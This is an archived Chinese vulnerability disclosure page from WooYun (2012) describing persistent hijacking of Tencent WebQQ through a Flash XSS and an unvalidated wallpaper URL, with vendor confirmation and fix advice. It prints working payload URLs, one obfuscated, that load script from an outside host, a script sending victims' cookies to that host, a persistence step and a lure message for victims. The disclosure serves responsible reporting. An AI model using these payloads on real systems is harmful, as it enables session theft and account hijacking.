@@ -1,0 +1,382 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		腾讯WEBQQ的持久劫持 - 反射型XSS到XSS后门的实现  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		腾讯WEBQQ的持久劫持 - 反射型XSS到XSS后门的实现  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-06-07 16:25</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-07：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-06-07：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-06-17：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-06-27：	细节向普通白帽子公开<br/>
+									2012-07-07：	细节向实习白帽子公开<br/>
+									2012-07-22：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">昨天在百度HI发现一个存储型的XSS之后，很自然的就联想到了WEBQQ，于是也对WEBQQ进行了测试。 发现一处问题，可对WEBQQ实现持久的劫持。当然，导致这个问题的一个功能，也是挺奇特的！-------------------- BTW，虽然腾讯也有漏洞响应平台了，= = 我也去看了下，开了个号，但是只看到漏洞贡献者名称，没有其他信息，有点迷茫的感觉，所以还是提交到乌云吧。 </p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">-------------------第一章，这是个什么奇葩的功能-----------------------<br />
+<br />
+<br />
+<br />
+1. 进入WEBQQ之后，首先是对聊天功能进行了测试，未发现和百度HI一样的问题。<br />
+<br />
+2. 而后，查看了WEBQQ的设置功能--》主题设置--》自定义。 <br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/07143036a776921637100daab3705e2dcbc42a2b.jpg" target="_blank"><img src="../images/07143036a776921637100daab3705e2dcbc42a2b.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3. 竟然拿一个网页做背景， 看来开发人员这么相信自己水平。 我随手试了下，可以拿百度直接做背景。 当然这本身不会带来安全问题，因为，跨域无法访问cookies数据。但是不能想象，这里的代码肯定是 &lt;iframe src=&quot;http://www.baidu.com&quot;&gt;&lt;/iframe&gt;这样的代码！<br />
+<br />
+<br />
+<br />
+4. 如果地址可以被设置为javascript:alert(1)，那么问题就来了。&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt; 将会引发跨站。 可是腾讯貌似做了设置，非法链接了？<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0714310877f01f880f9101752517f31ff72b2543.jpg" target="_blank"><img src="../images/0714310877f01f880f9101752517f31ff72b2543.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+5. 但观察发现，实际这个没向服务器做验证，于是，我们发送正常地址，抓包，再将地址改为javascript:alert(1)。<br />
+<br />
+<br />
+<br />
+刷新WEBQQ，成功弹出 1 。 这里我就不上图了，因为这章不重要～<br />
+<br />
+<br />
+<br />
+理论上来说， &lt;iframe src=&quot;javascript;alert(1)&quot;&gt;&lt;/iframe&gt; 应该是所有浏览器都可以的。<br />
+<br />
+<br />
+<br />
+但在测试时候，IE却意外的不执行。 打开调试工具，也可以看到，确实存在 &lt;iframe src=&quot;javascript;alert(1)&quot;&gt;&lt;/iframe&gt;。 找了下原因，也没找到，暂时没想到原因和解决办法！！<br />
+<br />
+<br />
+<br />
+-------------------第二章，再现FLASH XSS-----------------------<br />
+<br />
+<br />
+<br />
+但是，IE如果无效，就损失了很多可以被攻击的群体了，我们的目标是，通杀！<br />
+<br />
+<br />
+<br />
+既然可以iframe百度的页面，那么我们也可以iframe自己的页面。 <br />
+<br />
+<br />
+<br />
+问题就是自己的页面，无法获取qq.com域下的cookies。<br />
+<br />
+<br />
+<br />
+但是，如果我们能找到web.qq.com域名下的一个具有XSS的URL，然后iframe进我们自己的页面，就可以成功获取cookies了。<br />
+<br />
+<br />
+<br />
+1. 打开google, site:web.qq.com ，没什么结果，发现 robots.txt禁止了搜索引擎的抓取。<br />
+<br />
+<br />
+<br />
+2. 另一方面，常规的反射型XSS，扫描器都扫的差不多了，DOM-based的更是稀少。但是，flash类型的XSS，目前好像还不受到重视。<br />
+<br />
+<br />
+<br />
+3. 打开httpwatch（另外一个基于代理的抓包软件打开后，WEBQQ无法正常使用）, 发现了一个FLASH文件，看到地址里的，我就心动了！ Fileupload.swf，默认回首，那FLASH就在灯火阑珊处。 （FLASH地址：http://web.qq.com/swf/FileUploader.swf）<br />
+<br />
+<br />
+<br />
+4. 好，下载这个FLASH，反编译，搜索源码 ,external， 几下之后，可以发现 external.call调用了_jsCallback， _jsCallback=this.callback, this.callback则来自parameters.<br />
+<br />
+<br />
+<br />
+</p><pre><code>var _local1:Object = LoaderInfo(root.loaderInfo).parameters;<br />
+            if (_local1[&quot;callback&quot;]){<br />
+                this._jsCallBack = _local1[&quot;callback&quot;]; &lt;-- 直接调用未进行任何过滤<br />
+            };</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+5. 对于FLASH XSS的利用，我在wooyun已经发过很多了。此处不多说。<br />
+<br />
+<br />
+<br />
+直接上利用代码, 因为之前我提到过，以前的FLASH XSS代码，会导致Chrome崩溃，后来，我重新研究了下，对chrome和ie分别进行处理。<br />
+<br />
+<br />
+<br />
+ie:<br />
+<br />
+</p><pre><code>http://web.qq.com/swf/FileUploader.swf?callback=(function()%7Blocation.href%3D%22javascript%3A&#039;&lt;html&gt;&lt;body&gt;%3Cscript%3E(function(){function j(w){window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(47,47,120,115,115,116,46,115,105,110,97,97,112,112,46,99,111,109,47)%2bw%2bString.fromCharCode(46,106,115);document.body.appendChild(window.s)}j(String.fromCharCode(106,113));j(String.fromCharCode(119,113))})()%3C%2Fscript%3E&lt;/body&gt;&lt;/html&gt;&#039;%22%7D)()</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+chrome<br />
+<br />
+</p><pre><code>http://web.qq.com/swf/FileUploader.swf?callback=(function(){function j(w){window.s=document.createElement(&#039;script&#039;);window.s.src=&#039;//xsst.sinaapp.com/&#039;%2bw%2b&#039;.js&#039;;document.body.appendChild(window.s)}j(&#039;jq&#039;);j(&#039;wq&#039;)})()</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+6. 为了保证IE下，和chrome下都有效，这里我们用PHP在服务器端做个判断，根据浏览器类型做不同的输出。<br />
+<br />
+<br />
+<br />
+http://xsst.sinaapp.com/webqqbg.php代码如下<br />
+<br />
+<br />
+<br />
+</p><pre><code>see http://xsst.sinaapp.com/webqqbg.php.txt</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+7. http://xsst.sinaapp.com/webqqbg.php页面里的代码，会调用jq.js和wq.js <br />
+<br />
+<br />
+<br />
+8. wq.js 代码如下, 作用是将访问者的cookies发送到服务器端。<br />
+<br />
+<br />
+<br />
+</p><pre><code>var s=document.createElement(&quot;script&quot;);<br />
+s.src=&quot;http://xsst.sinaapp.com/getvfqq.php?cookie=&quot;+encodeURIComponent(document.cookie);<br />
+document.body.appendChild(s);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+-------------------第三章，XSS后门的实现-----------------------<br />
+<br />
+<br />
+<br />
+1. http://xsst.sinaapp.com/getvfqq.php 的代码如下，主要目的是，获取vfwebqq参数， 并将受害者的webqq壁纸设置为 http://xsst.sinaapp.com/webqqbg.php<br />
+<br />
+<br />
+<br />
+</p><pre><code>see http://xsst.sinaapp.com/getvfqq.php.txt</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+2. getvfqq.php 会设置用户的主题<br />
+<br />
+<br />
+<br />
+</p><pre><code>POST http://cgi.web2.qq.com/keycgi/qqweb/newuac/set.do<br />
+POSTDATA<br />
+retype	1<br />
+r	{&quot;appid&quot;:0,&quot;value&quot;:{&quot;theme&quot;:&quot;theme_pinky_night&quot;,&quot;appearance&quot;:&quot;&quot;,&quot;wallpaper&quot;:{&quot;id&quot;:&quot;theme_pinky_night&quot;,&quot;url&quot;:&quot;http://www.baidu.com&quot;,&quot;mode&quot;:&quot;iframe&quot;}}}<br />
+vfwebqq	5a47e8c50d39d9607f288f38052070d6efbf15b60be7ef6b4d01347a846b4a16a0377419ab1a763f</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+10. 因此。 我们只需要向正在使用WEBQQ的人，发送以下消息：<br />
+<br />
+<br />
+<br />
+</p><pre><code>嘿，在不，看看这个。<br />
+http://xsst.sinaapp.com/webqqbg.php</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+访问者访问了之后<br />
+<br />
+---&gt;就会引发flash xss<br />
+<br />
+---&gt;flash xss调用外部的wq.js<br />
+<br />
+---&gt;wq.js会调用http://xsst.sinaapp.com/getvfqq.php<br />
+<br />
+---&gt;getvfqq.php会获取vfwebqq参数，并向http://cgi.web2.qq.com/keycgi/qqweb/newuac/set.do发送主题数据<br />
+<br />
+---&gt;最后受害者的壁纸被设置成了http://xsst.sinaapp.com/webqqbg.php<br />
+<br />
+---&gt;每次登陆WEBQQ，都会加载我们自己的东西。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+11. 向一个同学和一个朋友做了测试，均成功！<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/071431548d9819db990e04021e1d2d92d072f061.jpg" target="_blank"><img src="../images/071431548d9819db990e04021e1d2d92d072f061.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+12. 上面可能写的有点乱。 下图比较清晰：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/071432065e1941756fb3e1d2a8dc7e6846f7a90e.jpg" target="_blank"><img src="../images/071432065e1941756fb3e1d2a8dc7e6846f7a90e.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">共测试3个用户。均成功实现劫持。劫持效果见详细说明。<br />
+<br />
+<br />
+<br />
+当然这个漏洞，可以在WEBQQ界面，伪造登陆窗口来实现QQ号码的偷取。<br />
+<br />
+<br />
+<br />
+没有对WEBQQ的架构进一步分析，是否可以实现聊天记录的监控，未进行深入测试。<br />
+<br />
+<br />
+<br />
+IE,chrome,ff均可。<br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1. 壁纸这个功能，是否有必要使用HTML？ 感觉挺危险的。 特别是对壁纸的地址，只在客户端进行了判断，很不严谨。<br />
+<br />
+<br />
+<br />
+2. 对http://web.qq.com/swf/FileUploader.swf进行修复。 对传入的JS函数名称进行过滤。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-07999" title="腾讯WEBQQ的持久劫持 - 反射型XSS到XSS后门的实现">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2012-06-07 17:48</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告，我们已推动业务尽快修复。避免用户受到攻击。<br />
+<br />
+gainover的分析和突破思路非常赞，我们给20份的rank，再次感谢。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="7999";
+var bugRating="2";
+var myRating="";
+var ratingCount="5";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
